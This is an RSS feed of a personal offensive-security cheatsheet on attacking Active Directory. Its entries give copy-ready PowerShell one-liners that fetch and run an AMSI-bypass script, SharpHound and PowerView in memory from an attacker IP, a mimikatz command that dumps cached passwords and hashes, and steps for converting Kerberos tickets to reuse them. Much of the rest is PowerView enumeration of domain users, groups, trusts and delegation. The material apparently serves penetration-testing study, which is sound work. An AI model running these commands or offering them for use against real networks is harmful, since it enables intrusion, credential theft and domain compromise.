<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Active Directory on Ceso Adventures</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/</link><description>Recent content in Active Directory on Ceso Adventures</description><generator>Hugo</generator><language>en-gb</language><lastBuildDate>Fri, 03 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/cheatsheets/hacking/active_directory/index.xml" rel="self" type="application/rss+xml"/><item><title>BloodHound</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/</guid><description>&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$attacker=&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.42.37&amp;#34;&lt;/span&gt;;$domain=&lt;span style="color:#e6db74"&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt;;IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/4msibyp455.ps1&amp;#34;&lt;/span&gt;);IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/SharpHound.ps1&amp;#34;&lt;/span&gt;);Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain $domain
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Exploitation</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/</guid><description>&lt;h1 id="list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer"&gt;List all available credentials cached (Hashes and Passwords; Logged on user and computer)&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mimikatz.exe &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="convert-to-ccache"&gt;Convert to ccache&lt;/h1&gt;
&lt;p&gt;We can use the tool &lt;code&gt;ticket_converter&lt;/code&gt; written by &lt;code&gt;zer1t0&lt;/code&gt; for converting kirbi tickets to ccache and viceversa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Convert from b64 encoded blob to kirbi:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [IO.File]::WriteAllBytes(&amp;#34;C:\fullpathtoticket.kirbi&amp;#34;, [Convert]::FromBase64String(&amp;#34;aaâ€¦&amp;#34;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Convert the .kiribi to .ccache:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; python ticket_converter.py ticket.ccache ticket.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Copy the ccache to our attacker machine and export the KRB5CCNAME variable:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; export KRB5CCNAME=/path/to/ticket.ccache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="genericall"&gt;GenericAll&lt;/h1&gt;
&lt;p&gt;_TODO&lt;/p&gt;</description></item><item><title>Permissions: ACE/SDDL - Format</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/</guid><description>&lt;ul&gt;
&lt;li&gt;ACE (Access Control Enties)&lt;/li&gt;
&lt;li&gt;SDDL (Security Descriptor Definition Language)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;--&amp;gt; ace_type: defines allow/deny/audit
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; ace_flags: inheritance objects
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; rights: incremental list with given permissions (allowed/audited/denied), incrmentalas ARE NOT the only ones
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; object_guid and inherit_object: Allows to apply an ACE on a specified objects by GUID values. GUID is an object class, attribute, set or extended right, if pressent limits the ACE&amp;#39;s to the object the GUID represents. Inherited GUID represents an object class, if present will limit the inheritance of ACE&amp;#39;s to the child enties only of that object
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; account_sid: SID of the object the ACE is applying, is the SID of the user or group to the one permissions are being assigned, sometimes there are acronyms of well known SID&amp;#39;s instead of numerical ones
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>PowerView - methods for enumeration</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/</guid><description>&lt;p&gt;This is the command for download injected into memory with an AMSI Bypass before&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$user=&lt;span style="color:#e6db74"&gt;&amp;#34;userNameHereIfQueryUsesIt&amp;#34;&lt;/span&gt;;$attacker=&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.49.107&amp;#34;&lt;/span&gt;;$dominio=&lt;span style="color:#e6db74"&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt;;IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/nieri.ps1&amp;#34;&lt;/span&gt;);IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/PowerView.ps1&amp;#34;&lt;/span&gt;);OneOfThePowerViewCmdsFromBelowHere
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="acls"&gt;ACLs&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-ObjectAcl -Identity ceso &amp;lt;-- Get all the objects and acls the given user has
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="users"&gt;Users&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteProperty Name Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Object {if ( $_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Maps all users in the domain into a table replacing the SID for the name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainUser -Domain example.com &amp;lt;-- Enumeration truncated only to the users in the given domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainUser -TrustedToAut &amp;lt;-- List all the SPN&amp;#39;s which have Constrained Delegation
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="groups"&gt;Groups&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteP ropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Objec t {if ($_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Maps all groups in the domain into a table replacing the SID for the name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainGroup -Domain example.com &amp;lt;-- Enumeration truncated only to the users in the given domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainGroupMember &amp;#34;Enterprise Admins&amp;#34; -Domain example.com &amp;lt;-- Get ALL the members of the group &amp;#34;Enterprise Admins&amp;#34; inside the example.com domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainForeignGroupMember -Domain example2.com &amp;lt;-- Enumerate groups in a trusted forest or domain which contains NON-NATIVE members
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="computers"&gt;Computers&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identit y -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Enumerate computers accounts in the domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainComputer -Unconstrained &amp;lt;-- Enumerate unconstrained computers
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainComputer -Identity cesoComputer &amp;lt;-- Verify that cesoComputer exists
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="trusts"&gt;Trusts&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainTrust &amp;lt;-- Enumerate trusts by making an LDAP query, this works by the DC creating a Trusted Domain Object (TDO)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainTrust -API &amp;lt;-- Enumerate trusts by using Win32 API DsEnumerateDomainTrusts
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- If I add the -domain flag, it will enumerate all the found in the domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainTrustMapping &amp;lt;-- Automate the process of enumeration for all forest trust and their child domains trust
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="sids"&gt;SID&amp;rsquo;s&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainSID &amp;lt;-- Get the SID of the current domain
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainSID -Domain example.com &amp;lt;-- Get the SID of example.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item></channel></rss>